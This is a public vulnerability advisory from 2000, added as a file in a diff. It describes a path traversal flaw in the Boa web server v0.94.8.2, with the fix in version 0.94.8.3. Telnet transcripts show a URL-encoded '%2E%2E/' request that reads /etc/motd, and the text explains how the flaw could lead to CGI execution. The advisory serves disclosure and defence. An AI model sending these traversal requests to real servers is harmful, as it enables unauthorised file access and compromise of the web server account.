@@ -1,0 +1,109 @@
+###############################################################
+ID: S21SEC-005-en
+Title: Vulnerability in BOA web server v0.94.8.2
+Date: 03/10/2000
+Status: Vendor contacted, patch available
+Scope: Arbitrary file access
+Platforms: Unix
+Author: llmora
+Location: http://www.s21sec.com/en/avisos/s21sec-005-en.txt
+Release: Public
+###############################################################
+
+				S 2 1 S E C
+
+			 http://www.s21sec.com
+
+	Vulnerability in BOA web server v0.94.8.2
+
+
+There is a security bug in BOA v0.94.8.2 that allows a malicious
+user to access files outside the document root of the web server
+as the user the server runs as.
+
+About BOA
+---------
+
+Boa is an open source high performance web server for Unix-alike
+computers (http://www.boa.org). It does file serving and dynamic
+content generation via CGI.
+
+Vulnerability description
+-------------------------
+
+- Reading any file in the web server
+
+The boa web server suffers of the well-known "../.." web server
+problem. If we request a document from the web server,
+using the "../.." technique, we get:
+
+homer:~$ telnet ilf 80
+Escape character is '^]'.
+GET /../../../../../../../../../../../etc/motd HTTP/1.0
+
+HTTP/1.0 404 Not Found
+
+<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD>
+<BODY><H1>404 Not Found</H1>
+The requested URL /etc/motd was not found on this server.
+</BODY></HTML>
+Connection closed by foreign host.
+homer:~$
+
+So apparently it doesn't work, as boa checks for "/.." in the path.
+
+By URL-encoding the "." in the request, we are able to skip the ".." test,
+allowing us to access the contents of any file the user running the
+web server has access to:
+
+homer:~$ telnet ilf 80
+GET
+/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2
+E/etc/motd HTTP/1.0
+
+HTTP/1.0 200 OK
+
+[... the /etc/motd file content is shown]
+
+Connection closed by foreign host.
+homer:~$
+
+If the administrator enables extension based CGI support with a line like
+this in the boa.conf file:
+
+AddType application/x-httpd-cgi cgi
+
+then a request for a file ending in .cgi will result in the file being
+executed with the privileges of the user id running the web server. This
+file can be placed in any folder throughout the file system, not strictly
+under the DocumentRoot, and be accessed using the previous bug, leading
+to the web server account compromise.
+
+Affected versions
+-----------------
+
+This bug has been tested and verified to be present in v0.94.8.2 of the boa
+web server. Version 0.92 of boa is not affected by this problem.
+
+Fix information
+---------------
+
+The boa development team has released v0.94.8.3 which fixes this
+vulnerability.
+Upgrades are available at the vendor website (http://www.boa.org).
+
+S21SEC wishes to thank the boa development team for acknowledging the issue
+and releasing a security patch in a matter of hours.
+
+Additional information
+----------------------
+
+This vulnerability was found and researched by:
+
+ Lluis Mora		llmora@s21sec.com
+
+You can find the latest version of this advisory at:
+
+	http://www.s21sec.com/en/avisos/s21sec-005-en.txt
+
+And other S21SEC advisories at http://www.s21sec.com/en/avisos/
